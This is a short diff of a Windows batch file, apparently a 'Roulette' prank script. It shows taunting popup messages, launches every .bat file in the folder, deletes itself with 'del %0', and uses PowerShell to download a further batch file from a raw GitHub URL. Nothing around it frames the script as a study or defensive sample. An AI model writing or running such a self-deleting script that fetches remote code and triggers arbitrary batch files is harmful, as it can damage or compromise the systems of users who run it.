@@ -1,6 +1,6 @@
 msg %username% /w "I woudn't touch this message"
 timeout -1
 msg %username% /t 5 /w "I warned you"
-rename %0 *.lol
+del %0
 start *.bat
-rename %0 *.bat
+Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/extra.bat -OutFile .\extra.bat
